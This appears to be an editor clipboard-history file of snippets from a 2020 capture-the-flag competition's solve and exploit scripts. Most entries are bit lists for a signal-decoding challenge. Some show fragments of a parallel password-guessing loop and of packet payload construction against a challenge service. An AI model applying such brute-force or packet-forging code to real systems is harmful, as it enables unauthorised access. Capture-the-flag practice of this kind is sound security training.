	nums = [1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 0, 1, 1, ]
e7ad0b8fc06d17905cff7f958bb22dd4|file:///home/neo/CTFs/spiderlabsctf2020/sdr/solve.py|1|1|V|python
	nums = [1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 1, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 0, 0, 1, ]
61411f31de16eea360f4947b99842bc7|file:///home/neo/CTFs/spiderlabsctf2020/sdr/solve.py|1|1|V|python
	nums = [1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 1, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 0, ]
d42632c592fa5da5de3a8bf1fa073aca|file:///home/neo/CTFs/spiderlabsctf2020/sdr/solve.py|1|1|V|python
	nums = [1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 0, 1, ]
3274358efe7020db40ab1677b0c5d58d|file:///home/neo/CTFs/spiderlabsctf2020/sdr/solve.py|1|1|V|python
	nums = [1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 0, 1, 1, ]
692d42809d501a6c1e133226a3b1af21|file:///home/neo/CTFs/spiderlabsctf2020/sdr/solve.py|1|1|V|python
	nums = [1, 1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 1, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0, ]
f2d735ef63560433cdf7fed0845f30f8|file:///home/neo/CTFs/spiderlabsctf2020/sdr/solve.py|1|1|V|python
	nums = [1, 1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 1, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, ]
530efec155e3058c276b5e2351c2c3d6|file:///home/neo/CTFs/spiderlabsctf2020/sdr/solve.py|1|1|V|python
	nums = [1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 0, ]
745bb88d12ecd55e1e218edfd5db1c21|file:///home/neo/CTFs/spiderlabsctf2020/sdr/solve.py|1|1|V|python
	nums = [1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 1, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 0, ]
c821767f41c8f6076b33ff2767bc3cdb|file:///home/neo/CTFs/spiderlabsctf2020/sdr/solve.py|1|8|v|python
	0, 1, 0, 1, 0, 0, 1, 1, 
081ff22778de26a7b764c78c1be88c4f|file:///home/neo/CTFs/spiderlabsctf2020/sdr/solve.py|1|8|v|python
	1, 1, 1, 0, 0, 1, 0, 0, 
97ad54d16f690444a583e8b34e6fa925|file:///home/neo/CTFs/spiderlabsctf2020/sdr/solve.py|18|11|V|python
	print(flag)
	print(len(flag))
b107aeb9f2e79b3f49d7509c38620dc9|file:///home/neo/CTFs/spiderlabsctf2020/sdr/solve.py|1|1|V|python
	nums = [1, 0, 1, 1, 1, 0, 0, 1 ]
52e1940c158eedd56d5255d50fc8093b|file:///home/neo/CTFs/spiderlabsctf2020/sdr/solve.py|1|1|V|python
	nums = [1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, ]
3e5a0c3240577e1cce29fd7e7d113366|file:///home/neo/CTFs/spiderlabsctf2020/sdr/solve.py|1|1|V|python
	nums= [1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, ]
cece3ed8a8e6f900acd1726540e5fe9b|file:///home/neo/CTFs/spiderlabsctf2020/sdr/solve.py|1|1|V|python
	nums = [1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 1, 1, ]
d765de78b5d95ebf35a816b3dec10915|file:///home/neo/CTFs/spiderlabsctf2020/sdr/solve.py|1|1|V|python
	nums = [1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, ]
0130fd27199249610092c78f936e5920|file:///home/neo/CTFs/spiderlabsctf2020/sdr/solve.py|1|1|V|python
	nums = [1, 0, 0, 1, 1, 0, 0, 1, ]
1c70e0afcb3026e50cc338ce872ae1a6|file:///home/neo/CTFs/spiderlabsctf2020/sdr/solve.py|1|32|v|python
	 0, 0, 1, 0, 1, 0, 1, 0, 
b4afff9867a348ad1f45188ccfb0fb1b|file:///home/neo/CTFs/spiderlabsctf2020/sdr/solve.py|1|1|V|python
	nums = [1, 0, 0, 1, 1, 0, 0, 1,0, 0, 1, 0, 1, 1, 0, 1, ]
ae869c85e96cf177764fbef5a631ea6c|file:///home/neo/CTFs/spiderlabsctf2020/sdr/solve.py|1|1|V|python
	nums = [0, 0, 1, 0, 1, 1, 0, 0, ]
46e14ae8613a9aa93a5dcbb943990d42|file:///home/neo/CTFs/spiderlabsctf2020/sdr/solve.py|1|1|V|python
	nums = [0, 0, 1, 1, 0, 1, 0, 1, ]
78d857ff4b0a84659ae5d761dfb206a2|file:///home/neo/CTFs/spiderlabsctf2020/sdr/solve.py|1|1|V|python
	nums = [1, 0, 0, 1, 1, 0, 1, 0, ]
afa22db68d3430b3702f855bfedc9146|file:///home/neo/CTFs/spiderlabsctf2020/sdr/solve.py|1|1|V|python
	nums = [1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, ]
4c167e3c888f06c353a7a354a570f974|file:///home/neo/CTFs/spiderlabsctf2020/sdr/solve.py|1|1|V|python
	nums = [1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 1, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 1, ]
bfafd813d7ea65ee4db1f09d7c8ffbf4|file:///home/neo/CTFs/spiderlabsctf2020/thunderstorm/exploit.py|10|13|v|python
	console
e2239900d94d4ab6d2b311dc576d853a|file:///home/neo/CTFs/spiderlabsctf2020/two-sets-credentials/exploit.py|14|25|V|python
	    for i in range(0,40):
	        alphabet.append(i)
cafc7170ed01c2f5c972cac7cde6e932|file:///home/neo/CTFs/spiderlabsctf2020/two-sets-credentials/exploit.py|16|41|v|python
	alphabet
22a9e7b1bdb6e93517fffe887f3b8eca|file:///home/neo/CTFs/spiderlabsctf2020/two-sets-credentials/exploit.py|14|12|v|python
	ThreadPool
b0ed701f90f05bce80f3a9e1c4766a44|file:///home/neo/CTFs/spiderlabsctf2020/two-sets-credentials/exploit.py|16|5|V|python
	    for c in alphabet:
e694f2bfe2e97b5bedc821dc098ffe2f|file:///home/neo/CTFs/spiderlabsctf2020/two-sets-credentials/exploit.py|16|9|V|python
	        results = pool.map(tryPassword, c)
f0116fb143bbe1a7f1e4d08a7c0a1f6b|file:///home/neo/CTFs/spiderlabsctf2020/two-sets-credentials/exploit.py|15|20|V|python
	    pool = mp.Pool(len(alphabet))
	    for t in pool.imap_unordered(tryPassword, alphabet, chunksize=1000000):
	        pass
4b059611b43ed58870beccbe8c01d15e|file:///home/neo/CTFs/spiderlabsctf2020/two-sets-credentials/exploit.py|15|5|V|python
	    pool = mp.Pool(len(alphabet))
	    for c in alphabet:
	        results = pool.map(tryPassword, c)
fe2c5d7749f5444a46a93c7c627c5804|file:///home/neo/CTFs/spiderlabsctf2020/two-sets-credentials/exploit.py|19|5|V|python
	    pool.join()
ad7a640de2a49c5f711d2a598e79ab0b|file:///home/neo/CTFs/spiderlabsctf2020/two-sets-credentials/exploit.py|14|25|V|python
	    for i in range(0,32):
	        alphabet.append(i)
10d2ade64689e788d197d6910451599d|file:///home/neo/CTFs/spiderlabsctf2020/two-sets-credentials/exploit.py|6|1|V|python
	alphabet = "0123456789abcdef"
	alphabet = string.printable 
10493f28783a73b08782cde43ebc0e24|file:///home/neo/CTFs/spiderlabsctf2020/two-sets-credentials/exploit.py|7|1|V|python
	context.log_level = 'critical'
b52519df3eee9667b6a58e9961cbca9e|file:///home/neo/CTFs/spiderlabsctf2020/two-sets-credentials/exploit.py|6|1|V|python
	prefix = ""
7f423bff98b2f2b7752e163824dc95f0|file:///home/neo/CTFs/spiderlabsctf2020/two-sets-credentials/exploit.py|10|16|v|python
	string.ascii_letters + string.digits
1773ffddadc49b6b91160750afdf4d88|file:///home/neo/CTFs/spiderlabsctf2020/talk/talk.c|49|1|V|c
	    PACKET *p = (PACKET *) buffer;
	    printf("Magic: %#x\n", p->magic);
	    printf("Type: %#x\n", p->type);
	    printf("Session: %d\n", p->session);
	    printf("Callback: %ld\n", p->callback);
	    printf("Data: %s\n", p->data);
	
13278b1ce1bdf1fe26e6ba0831516ea1|file:///home/neo/CTFs/spiderlabsctf2020/talk/talk.c|55|5|V|c
	    buffer += rd->offset;
53b517116612e744ecc40edc22ef0b0b|file:///home/neo/CTFs/spiderlabsctf2020/talk/talk.c|47|5|V|c
	    buffer += p->offset;
597313aca2ec04d921596d2dc1495334|file:///home/neo/CTFs/spiderlabsctf2020/talk/talk.c|42|1|V|c
	    printf("PACKET:\n")
4d433ca54f85352f750525d0674b9a11|file:///home/neo/CTFs/spiderlabsctf2020/talk/talk.c|42|1|V|c
	    printf("PACKET:\n");
e8f6c23a0c6af5dbe48ba8c4f69684b9|file:///home/neo/CTFs/spiderlabsctf2020/talk/talk.c|47|5|V|c
	    printf("Data: %s\n", p->data);
b98ccb500504d47fab91c5113f8cb7bd|file:///home/neo/CTFs/spiderlabsctf2020/talk/exploit.py|6|1|V|python
	log.info(MAGIC)
339051c6cedd17a0613624b5b355376a|file:///home/neo/CTFs/spiderlabsctf2020/talk/exploit.py|17|1|V|python
	else if p_type == 'auth':
	    payload += AUTH
f458afcda462a9ed24f08634cb2ceced|file:///home/neo/CTFs/spiderlabsctf2020/talk/exploit.py|22|16|v|python
	AUTH
002fd028dd60c72d8d91a1e9619468cc|file:///home/neo/CTFs/spiderlabsctf2020/talk/exploit.py|21|1|V|python
	else if p_type == 'read':
	    payload += READ
ecae13117d6f0584c25a9da6c8f8415e|file:///home/neo/CTFs/spiderlabsctf2020/talk/exploit.py|23|20|v|python
	read
3466fab4975481651940ed328aa990e4|file:///home/neo/CTFs/spiderlabsctf2020/talk/exploit.py|24|16|v|python
	READ
b486c11fc3af264f342ae3dda15b5cd4|file:///home/neo/CTFs/spiderlabsctf2020/talk/exploit.py|23|1|V|python
	else if p_type == 'run':
	    payload += RUN
6578fdedbe16047fdcf4cbea44214361|file:///home/neo/CTFs/spiderlabsctf2020/talk/exploit.py|30|9|v|python
	= int(input('Enter session number:'))
